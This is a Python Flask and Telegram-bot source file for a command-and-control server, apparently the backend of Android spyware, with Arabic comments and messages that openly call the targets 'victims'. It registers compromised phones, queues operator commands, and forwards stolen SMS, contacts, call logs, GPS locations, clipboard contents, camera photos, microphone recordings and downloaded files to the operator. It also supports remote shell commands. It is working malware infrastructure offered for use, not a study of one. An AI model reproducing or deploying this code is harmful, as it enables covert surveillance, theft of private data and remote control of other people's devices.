import os
import logging
import threading
from flask import Flask, request, jsonify
import telebot

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_ID = os.environ.get('ADMIN_ID', '')

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML') if BOT_TOKEN else None

# تخزين الأجهزة المتصلة والمهام المعلقة لكل جهاز
connected_devices = {}
pending_commands = {}

@app.route('/')
def index():
    return jsonify({
        "status": "online",
        "system": "NSR Empire Advanced C2 Server",
        "version": "7.11"
    }), 200

# نقطة الاتصال الرئيسية للعميل (تتوافق مع C2Client.kt)
@app.route('/api/v1/stream', methods=['POST', 'GET'])
@app.route('/api/connect', methods=['POST'])
def agent_connect():
    try:
        data = request.json if request.is_json else request.form.to_dict()
        device_id = data.get('device_id', 'Android_Device_Client') if data else 'Android_Device_Client'
        
        is_new_device = device_id not in connected_devices
        connected_devices[device_id] = data or {"status": "connected"}
        
        if is_new_device and bot and ADMIN_ID:
            bot.send_message(
                ADMIN_ID,
                f"🚨 <b>تم رصد اتصال جديد من جهاز ضحية!</b>\n\n"
                f"📱 <b>معرف الجهاز:</b> <code>{device_id}</code>\n"
                f"⚡ النظام جاهز لإعطاء الأوامر."
            )
        
        # سحب الأمر المعلق وإرساله للعميل للتنفيذ
        command_to_execute = pending_commands.pop(device_id, "wait")
        return jsonify({"status": "success", "command": command_to_execute}), 200
    except Exception as e:
        logger.error(f"Connect error: {e}")
        return jsonify({"error": str(e)}), 500

# نقطة استقبال التقارير والبيانات (رسائل، جهات اتصال، مكالمات، موقع)
@app.route('/api/report', methods=['POST'])
def agent_report():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No data"}), 400
            
        device_id = data.get('device_id', 'Unknown')
        task_type = data.get('task_type', 'General')
        content = data.get('content', 'No content')
        
        logger.info(f"Report received [{task_type}] from {device_id}")
        
        if bot and ADMIN_ID:
            report_msg = (
                f"📥 <b>تقرير ميداني ناجح [{task_type}]</b>\n\n"
                f"👤 <b>الضحية:</b> <code>{device_id}</code>\n\n"
                f"📦 <b>البيانات المستخرجة:\n</b><code>{str(content)[:3500]}</code>"
            )
            bot.send_message(ADMIN_ID, report_msg)
            
        return jsonify({"status": "received"}), 200
    except Exception as e:
        logger.error(f"Report error: {e}")
        return jsonify({"error": str(e)}), 500

# نقطة استقبال الملفات والمستندات المسحوبة والوسائط (صور، تسجيلات، ملفات النظام)
@app.route('/api/upload', methods=['POST'])
def agent_upload():
    try:
        device_id = request.form.get('device_id', 'Unknown')
        task_type = request.form.get('task_type', 'File')
        
        if 'file' in request.files:
            file = request.files['file']
            filename = file.filename or 'captured_file.bin'
            file_bytes = file.read()
            
            logger.info(f"File received [{filename}] from {device_id}")
            
            if bot and ADMIN_ID:
                bot.send_message(
                    ADMIN_ID,
                    f"📁 <b>تم استلام ملف/وسائط بنجاح!</b>\n\n"
                    f"👤 <b>الضحية:</b> <code>{device_id}</code>\n"
                    f"📂 <b>نوع المهمة:</b> <code>{task_type}</code>\n"
                    f"📄 <b>اسم الملف:</b> <code>{filename}</code>"
                )
                bot.send_document(ADMIN_ID, (filename, file_bytes))
                
        return jsonify({"status": "uploaded"}), 200
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({"error": str(e)}), 500

if bot:
    @bot.message_handler(commands=['start', 'help'])
    def send_welcome(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
        help_text = (
            "👑 <b>لوحة تحكم إمبراطورية NSR C2 - الإصدار الحربي الشامل</b>\n\n"
            "📋 <b>أوامر الإدارة:</b>\n"
            "• /devices - عرض الأجهزة المتصلة\n"
            "• /cmd [ID] [الأمر] - إرسال أمر للتنفيذ\n\n"
            "⚔️ <b>الأوامر الميدانية الحقيقية المدعومة:</b>\n"
            "  - <code>get_sms</code> : سحب الرسائل القصيرة\n"
            "  - <code>get_contacts</code> : سحب دفتر الأرقام\n"
            "  - <code>get_calls</code> : سحب سجل المكالمات\n"
            "  - <code>get_location</code> : جلب احداثيات الـ GPS\n"
            "  - <code>get_clipboard</code> : سحب الحافظة\n"
            "  - <code>take_photo_front</code> : التقاط صورة كاميرا أمامية\n"
            "  - <code>take_photo_back</code> : التقاط صورة كاميرا خلفية\n"
            "  - <code>record_mic</code> : تسجيل صوت محيطي\n"
            "  - <code>download:[مسار_الملف]</code> : سحب ملف من جهاز الضحية\n"
            "  - <code>shell:[امر]</code> : تنفيذ أمر شل نظامي\n\n"
            "<i>مثال:</i>\n<code>/cmd Android_Device_Client get_sms</code>"
        )
        bot.reply_to(message, help_text)

    @bot.message_handler(commands=['devices'])
    def list_devices(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
        if not connected_devices:
            bot.reply_to(message, "⚠️ لا توجد أجهزة متصلة حالياً.")
            return
            
        msg = "🎯 <b>الأجهزة والضحايا النشطة:</b>\n\n"
        for dev_id in connected_devices.keys():
            msg += f"💀 <code>{dev_id}</code>\n"
        bot.reply_to(message, msg)

    @bot.message_handler(commands=['cmd'])
    def send_command(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
        args = message.text.split(maxsplit=2)
        if len(args) < 3:
            bot.reply_to(message, "⚠️ خطأ في الصيغة!\nالاستخدام: <code>/cmd [ID_الجهاز] [الأمر]</code>")
            return
            
        target_id = args[1]
        command_str = args[2]
        
        pending_commands[target_id] = command_str
        bot.reply_to(
            message,
            f"🚀 <b>تم حقن الأمر بنجاح!</b>\n\n"
            f"• الأمر: <code>{command_str}</code>\n"
            f"• الضحية: <code>{target_id}</code>\n"
            f"⏳ سيتم التنفيذ فوراً في دورة الاتصال القادمة."
        )

    def run_bot():
        try:
            bot.infinity_polling(skip_pending=True)
        except Exception as e:
            logger.error(f"Bot error: {e}")

    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
